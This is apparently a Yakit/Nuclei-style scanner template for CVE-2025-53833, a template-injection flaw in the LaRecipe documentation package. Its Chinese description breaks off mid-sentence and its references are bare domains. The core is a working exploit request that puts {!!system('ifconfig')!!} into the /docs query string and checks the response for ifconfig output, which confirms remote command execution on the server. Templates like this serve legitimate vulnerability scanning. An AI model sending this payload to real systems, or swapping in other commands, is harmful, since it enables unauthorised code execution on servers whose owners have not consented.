content:
id: CVE-2025-53833

info:
  name: LaRecipe 模板注入漏洞
  author: Deans
  severity: high
  description: 在于 LaRecipe 的文档渲染模块采用了不安全的动态模板编译方式。具体而言，当系统解析 Markdown 文档时，会直接通过 
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 2
    shodan-query: ""
    verified: true
  yakit-info:
    sign: ad091978380e490a5ef2951af73ba0a3

http:
- raw:
  - |+
    @timeout: 30s
    GET /docs/1.0/?99980001 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

  - |+
    @timeout: 30s
    GET /docs/1.0?{!!system('ifconfig')!!} HTTP/1.1
    Host: {{Hostname}}
    Upgrade-Insecure-Requests: 1
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2


  max-redirects: 3
  matchers-condition: and
  matchers:
  - id: 1
    type: word
    part: body
    words:
    - "99980001"
    condition: and

  - id: 2
    type: word
    part: body
    words:
    - netmask
    - broadcast
    - inet6
    condition: and
